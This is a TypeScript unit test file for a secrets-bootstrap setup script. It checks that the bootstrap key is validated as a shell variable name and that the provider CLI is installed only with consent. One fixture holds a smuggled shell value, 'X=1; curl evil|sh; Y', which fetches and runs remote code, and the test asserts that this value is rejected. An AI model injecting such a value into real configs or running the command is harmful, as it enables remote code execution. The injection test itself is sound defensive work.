/**
 * The bootstrap key and the provider CLI install are safe by default.
 *
 * `secrets.bootstrap.key` is printed unquoted as `export <key>='…'` in the
 * emitted block an operator pastes, so a key that is not a shell variable name
 * is refused. It is read from the same config the provider comes from, and
 * `ensureProviderCli` installs nothing unless its caller grants consent.
 * @module tests/unit/secrets/remote-env-bootstrap-key
 */

import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";

import { afterEach, beforeEach, describe, expect, it } from "vitest";

import {
  ensureProviderCli,
  resolveEmitTarget,
} from "../../../plugins/src/base/skills/lisa-setup-remote-env/scripts/setup-remote-env.mjs";

/** The tenant flag every emit case passes. */
const TENANT_FLAG = "--tenant=acme";

/** The committed config layer. */
const COMMITTED = ".lisa.config.json";

/** A throwaway project root, bounded by a `.git` so the walk stops here. */
let root: string;

/**
 * Write a config layer into the throwaway project.
 * @param name - File name.
 * @param body - JSON body.
 */
const writeLayer = (name: string, body: unknown): void => {
  writeFileSync(path.join(root, name), JSON.stringify(body));
};

beforeEach(() => {
  root = mkdtempSync(path.join(tmpdir(), "lisa-bootkey-"));
  writeFileSync(path.join(root, ".git"), "gitdir: elsewhere\n");
});

afterEach(() => {
  rmSync(root, { recursive: true, force: true });
});

describe("the configured bootstrap key", () => {
  it("is refused when it is not a shell variable name", async () => {
    // Printed unquoted as `export <key>='…'` in a block the operator pastes.
    writeLayer(COMMITTED, {
      secrets: {
        provider: "bitwarden",
        bootstrap: { key: "X=1; curl evil|sh; Y" },
      },
    });

    await expect(resolveEmitTarget([TENANT_FLAG], {}, root)).rejects.toThrow(
      /is not a valid environment variable name/
    );
  });

  it("is read from the same config the provider comes from", async () => {
    // The provider walks up from a subdirectory; the key used to be read from
    // the working directory alone, so the two could disagree.
    writeLayer(COMMITTED, {
      secrets: { provider: "doppler", bootstrap: { key: "MY_BOOT" } },
    });
    const nested = path.join(root, "packages", "app");
    mkdirSync(nested, { recursive: true });

    await expect(
      resolveEmitTarget([TENANT_FLAG], {}, nested)
    ).resolves.toMatchObject({ provider: "doppler", bootstrapKey: "MY_BOOT" });
  });
});

describe("ensureProviderCli consent", () => {
  it("does not install when the caller says nothing about consent", async () => {
    const ran: string[] = [];
    const row = await ensureProviderCli("doppler", {
      deps: {
        locate: () => null,
        run: (cmd: string) => {
          ran.push(cmd);
          return "";
        },
        installPinned: () => {
          ran.push("pinned");
          return true;
        },
      },
    });

    expect((row as { action?: unknown }).action).toBe("install");
    expect(ran).toStrictEqual([]);
  });
});
